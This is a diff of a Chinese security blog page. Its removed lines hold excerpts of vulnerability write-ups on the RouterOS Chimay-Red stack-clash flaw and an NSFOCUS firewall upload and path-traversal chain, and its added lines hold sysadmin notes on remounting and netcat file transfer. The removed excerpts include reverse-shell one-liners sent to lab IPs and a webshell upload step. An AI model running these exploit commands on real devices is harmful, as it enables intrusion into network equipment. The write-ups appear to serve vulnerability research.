@@ -5,11 +5,11 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
-<title>vuln | CAI dog</title>
+<title>note | CAI dog</title>
 <meta name="keywords" content="">
-<meta name="description" content="vuln - CAI dog">
+<meta name="description" content="note - CAI dog">
 <meta name="author" content="shangdi4sb">
-<link rel="canonical" href="https://jellyfish-pro.github.io/posts/">
+<link rel="canonical" href="https://jellyfish-pro.github.io/note/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
 <link rel="icon" href="https://jellyfish-pro.github.io/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="https://jellyfish-pro.github.io/favicon-16x16.png">
@@ -18,7 +18,7 @@
 <link rel="mask-icon" href="https://jellyfish-pro.github.io/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" type="application/rss+xml" href="https://jellyfish-pro.github.io/posts/index.xml">
+<link rel="alternate" type="application/rss+xml" href="https://jellyfish-pro.github.io/note/index.xml">
 <noscript>
     <style>
         #theme-toggle,
@@ -55,13 +55,13 @@
         }
 
     </style>
-</noscript><meta property="og:title" content="vuln" />
+</noscript><meta property="og:title" content="note" />
 <meta property="og:description" content="" />
 <meta property="og:type" content="website" />
-<meta property="og:url" content="https://jellyfish-pro.github.io/posts/" />
+<meta property="og:url" content="https://jellyfish-pro.github.io/note/" />
 
 <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="vuln"/>
+<meta name="twitter:title" content="note"/>
 <meta name="twitter:description" content=""/>
 
 
@@ -73,8 +73,8 @@
     {
       "@type": "ListItem",
       "position":  2 ,
-      "name": "vuln",
-      "item": "https://jellyfish-pro.github.io/posts/"
+      "name": "note",
+      "item": "https://jellyfish-pro.github.io/note/"
     }
   ]
 }
@@ -133,12 +133,12 @@
             </li>
             <li>
                 <a href="https://jellyfish-pro.github.io/posts" title="posts">
-                    <span class="active">posts</span>
+                    <span>posts</span>
                 </a>
             </li>
             <li>
                 <a href="https://jellyfish-pro.github.io/note" title="note">
-                    <span>note</span>
+                    <span class="active">note</span>
                 </a>
             </li>
             <li>
@@ -152,85 +152,41 @@
 <main class="main"> 
 <header class="page-header"><div class="breadcrumbs"><a href="https://jellyfish-pro.github.io">Home</a></div>
   <h1>
-    vuln
+    note
   </h1>
 </header>
 
 <article class="post-entry"> 
   <header class="entry-header">
-    <h2>RouterOS软路由线程同步漏洞
+    <h2>报错read-only file system解决方法
     </h2>
   </header>
   <div class="entry-content">
-    <p>RouterOS软路由线程同步漏洞 漏洞简介 该漏洞存在于RouterOS 6.38.4及以下版本。漏洞原理为未对 alloca()函数分配内存的大小做限制，导致alloca()函数可分配超过本线程内存块大小的内存，从而非法访问其他线程的内存。
-漏洞复现 RouterOS环境搭建 因为该漏洞为软路由漏洞，且有x86架构，故我们可使用VMware直接模拟。
-首先我们需要先下载Routeros的镜像，或者直接去官网下载镜像
-这里我选择的是 RouterOS 6.38.4
-然后使用VMware模拟，这里我们指出几个需要注意的点：
-这里可以选择Linux 3.x 内核。
-随后创建完成虚拟机后，需要修改虚拟机配置：
-这里需要将 硬盘(SCSI)改为IDE
-随后启动RouterOS虚拟机，一般说来，第一次开机会选择需要安装的服务这里我们直接输入&#39;a&#39;选择所有，然后输入&#39;i&#39;进行安装，然后根据提示一直按 &#39;y&#39;就可以：
-安装好后使用 admin：&#39;&#39;登录RouterOS。
-然后输入setup命令，根据提示设置ip地址
-最后打开浏览器，访问刚刚设定的IP地址，如能访问，则证明安装完成。
-RouterOS越狱 因为RouterOS原生操作系统是基于Linux系统复写的一套新操作系统。原生的RouterOS甚至连busybox都没有，更别说后面的调试了。所以我们需要对其进行越狱处理。
-这里我们使用的是 mikrotik-tools工具，该工具可以帮助我们进入RouterOS的Linux系统。
-使用方法也很简单：
-#git clone https://github.com/0ki/mikrotik-tools.git#cd mikrotik-tools#./exploit-backup/exploit_full.sh 随后按照提示输入对应信息就可以。
-**注：**因为该方法使用的ssh远程连接RouterOS，所以一些太过古老的版本会提示ssh找不到对应的加密方式。
-出现截图中的语句则表示越狱成功。
-接下来我们就可以使用telnet连接RouterOS了。(用户密码为 devel:&#39;&#39;)
-RouterOS漏洞复现 这里我们使用Chimay-Red项目中的exp.
-**注：**该exp需要python2版本的pwntools模块。(直接改成符合python3的语法就行，只需要修改几个字符类型就行。别去安装python2的pwntools环境，浪费时间。别问我怎么知道的)
-首先我们先获取当前RouterOS版本中存在漏洞的二进制文件：
-#./tools/getROSbin.py 6.38.4 x86 /nova/bin/www www_6384_x86 随后使用nc监听端口：
-#nc -lnvp 8080 然后使用exp，执行命令：
-#./StackClash_x86.py 192.168.113.129 80 www_binary &#34;mknod /ram/f p; /bin/telnet 192.168.113.128 8080 &lt; /ram/f | /bin/bash &gt;/ram/f 2&gt;&amp;1&#34; 漏洞代码分析 在上面的exp利用中，我们看到了，漏洞点是在 /nova/bin/www 中的 alloca函数，因此我们将刚刚拿到的二进制文件，放入IDA。...</p>
+    <p>mount -o remount,rw / 使用mount命令重新挂载根目录，给一个可读可写的权限</p>
   </div>
-  <footer class="entry-footer">2 min&nbsp;·&nbsp;shangdi4sb</footer>
-  <a class="entry-link" aria-label="post link to RouterOS软路由线程同步漏洞" href="https://jellyfish-pro.github.io/posts/routeros%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5%E6%BC%8F%E6%B4%9E/"></a>
+  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to 报错read-only file system解决方法" href="https://jellyfish-pro.github.io/note/%E6%8A%A5%E9%94%99read-only-file-system%E7%BB%93%E5%B1%80%E6%96%B9%E6%B3%95/"></a>
 </article>
 
 <article class="post-entry"> 
   <header class="entry-header">
-    <h2>绿盟NG3 G2000L防火墙文件上传和路径穿越组合漏洞
+    <h2>设备无scp命令时将文件传出的方法
     </h2>
   </header>
   <div class="entry-content">
-    <p>绿盟NG3 G2000L防火墙文件上传和路径穿越组合漏洞 漏洞介绍 测试环境时在绿盟NG3 G2000L防火墙上进行的，固件版本：V6.0.1.58；引擎版本：V6.0.3.134。
-根据网络上就传的poc信息，该漏洞组合可能广泛存在于绿盟的整个NG系列防火墙上。不过因为防火墙和固件版本不一样，导致最终的发包内容有所区别。
-文件上传漏洞：该漏洞是因为开发时并没有考虑到特殊情况，从而产生漏洞 路径穿越漏洞：该漏洞是因为文件上传漏洞造成的次生漏洞，因为攻击者上传了特殊文件，从而导致攻击者可以控制本不能控制的参数，从而造成路径穿越。 环境复现 对绿盟防火墙环境的复现可以既简单又困难 矛盾文学（雾）
-困难的地方在于，在网络上找不到绿盟防火墙的完整固件。在其官网中也只能找到升级包，而并非完整的固件包。
-但如果能够直接购买到设备，那就会变得特别的简单。
-无法获得底层shell 当然拿到设备后，可以发现该设备有很多账户，但是只有develop账户可以进入最底层的Linux。可这个账户的密码，是根据一套算法实时计算的，只有寻找绿盟客服才能获得密码。
-所以我们只能采取其他方法。
-漏洞分析 文件上传漏洞 这里我们首先使用bp模拟发包：
-这里首先上传了一个名sess_82c13f359d0dd8f51c29d658a9c8ac71的文件，其实通过这个文件名称，我们就可以大概猜到其作用：想要保存一个session对话。
-一般sess打头的文件都是放在*/tmp*目录下，但以防万一，我们还是在代码中找了一下：
-./nsfocus/web/rest4espc/ipsv1/dispatch/v1/device/bugsInfo/resourse.php 通过代码，可以发现上传路径就是*/tmp*。
-同时，在这个文件中还可以看到一个身份判断：
-这里将$token和$contents进行比较，$contents来自*/tmp/token*文件，而$token来自我们GET传输的数据。
-那么我们如何绕过这个验证呢？答案是什么都不做。
-因为如果我们访问的sess文件中没有$contents的值，则php就会将$contents置为空。同时如果我们发包时，不使用GET传递参数，那么php会将$token也置为空。两个值都置空了，那两个值不就相等了？PHP 是最好的语言
-路径穿越漏洞 通过bp的包，我们可以看到，这时的session_id是最开始我们上传的文件名
-那么这个包，是怎么导致路径穿越的呢？根据上面这个包访问的路径：
-./nsfocus/web/apache2/sslvpn/mail/include/header_main.php 可以看到这里包含了一个叫做compose.php的文件，文件本来的意思是读取session中&#34;lang&#34;的值，并将这个值拼接成一个路径。
-但是我们在伪造的sess文件中存入了特殊的&#34;lang&#34;的值：
-lang|s:52:&#34;../../../../../../../../../../../../../../../../tmp/&#34; 为了直观显示被修改后的效果，这里我修改了原文件，使其输出$lang：
-通过这样的方法，我们就控制了$lang的值，从而让PHP文件包含了我们指定文件夹下的compose.php文件
-漏洞利用 通过上面的漏洞分析，我们可以将利用链总结如下：
-上传一个伪造session，使第二个漏洞包含*/tmp下的compose.php*文件。 然后再上传一个含有一句话马的名字为compose.php的文件到*/tmp*下 最后访问header_main.php，触发路径穿越，导致包含到*/tmp下刚刚上传的compose.php*文件。 最后exp 上传第一个包：
-上传第二个包：
-最后触发路径穿越：
-./test2.py 192.168.1.1 &#34;rm /tmp/f; mknod /tmp/f p; /bin/telnet 192.168.1.3 8080 &lt; /tmp/f | /bin/bash &gt;/tmp/f 2&gt;/tmp/f&#34; </p>
+    <p>首先检查是否有wget或curl
+然后检查设备的busybox中是否有nc命令
+本地开启http服务，准备好对应架构的busybox，利用wget或curl获取busybox
+随后在本地打开nc准备接受：
+nc -l port &gt; your_file 在设备上使用命令：
+./busybox nc ip port &lt; your_file </p>
   </div>
   <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
-  <a class="entry-link" aria-label="post link to 绿盟NG3 G2000L防火墙文件上传和路径穿越组合漏洞" href="https://jellyfish-pro.github.io/posts/lvmeng_ng3_g2000l_firewall_upload_pathtraversal/"></a>
+  <a class="entry-link" aria-label="post link to 设备无scp命令时将文件传出的方法" href="https://jellyfish-pro.github.io/note/%E8%AE%BE%E5%A4%87%E6%97%A0scp%E5%91%BD%E4%BB%A4%E6%97%B6%E5%B0%86%E6%96%87%E4%BB%B6%E4%BC%A0%E5%87%BA%E7%9A%84%E6%96%B9%E6%B3%95/"></a>
 </article>
 <footer class="page-footer">
   <nav class="pagination">
-    <a class="prev" href="https://jellyfish-pro.github.io/posts/">
+    <a class="prev" href="https://jellyfish-pro.github.io/note/">
       «&nbsp;Prev&nbsp;
     </a>
   </nav>
